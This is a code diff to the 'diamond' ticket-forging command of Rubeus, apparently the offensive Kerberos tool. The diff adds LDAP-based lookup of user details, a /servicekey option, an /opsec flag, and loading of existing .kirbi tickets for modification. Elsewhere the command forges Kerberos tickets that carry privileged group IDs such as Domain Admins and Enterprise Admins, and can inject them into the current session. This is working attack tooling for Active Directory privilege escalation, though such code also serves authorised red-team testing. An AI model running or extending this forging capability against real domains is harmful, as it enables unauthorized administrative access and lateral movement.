@@ -22,15 +22,22 @@ namespace Rubeus.Commands
             string outfile = "";
             string certificate = "";
             string krbKey = "";
+            string serviceKey = "";
             string ticketUser = "";
-            string groups = "520,512,513,519,518";
+            string groups = "";
             int ticketUserId = 0;
             string sids = "";
 
+            bool opsec = arguments.ContainsKey("/opsec");
             bool ptt = arguments.ContainsKey("/ptt");
+            bool ldap = arguments.ContainsKey("/ldap");
+            if (!ldap) { groups = "520,512,513,519,518"; };
+            string ldapuser = null;
+            string ldappassword = null;
             bool tgtdeleg = arguments.ContainsKey("/tgtdeleg");
             LUID luid = new LUID();
             Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
+            KRB_CRED kirbi = null;
 
             if (arguments.ContainsKey("/user"))
             {
@@ -49,6 +56,10 @@ namespace Rubeus.Commands
             {
                 domain = arguments["/domain"];
             }
+            if (arguments.ContainsKey("/opsec"))
+            {
+                opsec = true;
+            }
             if (arguments.ContainsKey("/dc"))
             {
                 dc = arguments["/dc"];
@@ -62,16 +73,24 @@ namespace Rubeus.Commands
                 sids = arguments["/sids"];
             }
             encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
-            if (arguments.ContainsKey("/enctype")) {
+            if (arguments.ContainsKey("/enctype"))
+            {
                 string encTypeString = arguments["/enctype"].ToUpper();
 
-                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM")) {
+                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
+                {
                     encType = Interop.KERB_ETYPE.rc4_hmac;
-                } else if (encTypeString.Equals("AES128")) {
+                }
+                else if (encTypeString.Equals("AES128"))
+                {
                     encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
-                } else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES")) {
+                }
+                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
+                {
                     encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-                } else if (encTypeString.Equals("DES")) {
+                }
+                else if (encTypeString.Equals("DES"))
+                {
                     encType = Interop.KERB_ETYPE.des_cbc_md5;
                 }
             }
@@ -123,18 +142,24 @@ namespace Rubeus.Commands
                 hash = arguments["/aes256"];
                 encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
             }
-            
-            if (arguments.ContainsKey("/certificate")) {
+
+            if (arguments.ContainsKey("/certificate"))
+            {
                 certificate = arguments["/certificate"];
             }
-            if (arguments.ContainsKey("/krbkey")) {
+            if (arguments.ContainsKey("/krbkey"))
+            {
                 krbKey = arguments["/krbkey"];
+            }
+            if (arguments.ContainsKey("/servicekey"))
+            {
+                serviceKey = arguments["/servicekey"];
             }
             if (arguments.ContainsKey("/ticketuser"))
             {
                 ticketUser = arguments["/ticketuser"];
             }
-            if (arguments.ContainsKey("/groups")) 
+            if (arguments.ContainsKey("/groups"))
             {
                 groups = arguments["/groups"];
             }
@@ -176,26 +201,74 @@ namespace Rubeus.Commands
                 Console.WriteLine();
             }
 
-           if (tgtdeleg)
-           {
+            // getting the user information from LDAP
+            if (arguments.ContainsKey("/ldap"))
+            {
+                ldap = true;
+                if (arguments.ContainsKey("/creduser"))
+                {
+                    if (!arguments.ContainsKey("/credpassword"))
+                    {
+                        Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
+                        return;
+                    }
+
+                    ldapuser = arguments["/creduser"];
+                    ldappassword = arguments["/credpassword"];
+                }
+
+                if (String.IsNullOrEmpty(domain))
+                {
+                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
+                }
+            }
+            
+            if (arguments.ContainsKey("/ticket"))
+            {
+                string kirbi64 = arguments["/ticket"];
+
+                if (Helpers.IsBase64String(kirbi64))
+                {
+                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
+                    kirbi = new KRB_CRED(kirbiBytes);
+                }
+                else if (File.Exists(kirbi64))
+                {
+                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
+                    kirbi = new KRB_CRED(kirbiBytes);
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
+                }
+            }
+            
+            if (tgtdeleg)
+            {
                 KRB_CRED cred = null;
-                try {
+                try
+                {
                     cred = new KRB_CRED(LSA.RequestFakeDelegTicket());
                 }
-                catch {
+                catch
+                {
                     Console.WriteLine("[X] Unable to retrieve TGT using tgtdeleg");
                     return;
                 }
-                ForgeTickets.ModifyTicket(cred, krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
+                ForgeTickets.ModifyTicket(cred, krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, dc, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
+            }
+            else if (null!=kirbi)
+            {
+                ForgeTickets.ModifyTicket(kirbi, serviceKey, krbKey, outfile, ldap, ldapuser, ldappassword, dc, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
             }
             else
             {
                 if (String.IsNullOrEmpty(certificate))
-                    ForgeTickets.DiamondTicket(user, domain, hash, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
+                    ForgeTickets.DiamondTicket(user, domain, hash, encType, outfile, opsec, ldap, ptt, ldapuser, ldappassword, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
                 else
-                    ForgeTickets.DiamondTicket(user, domain, certificate, password, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
+                    ForgeTickets.DiamondTicket(user, domain, certificate, password, encType, outfile, opsec, ldap, ptt, ldapuser, ldappassword, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
             }
-
+            
             return;
         }
     }
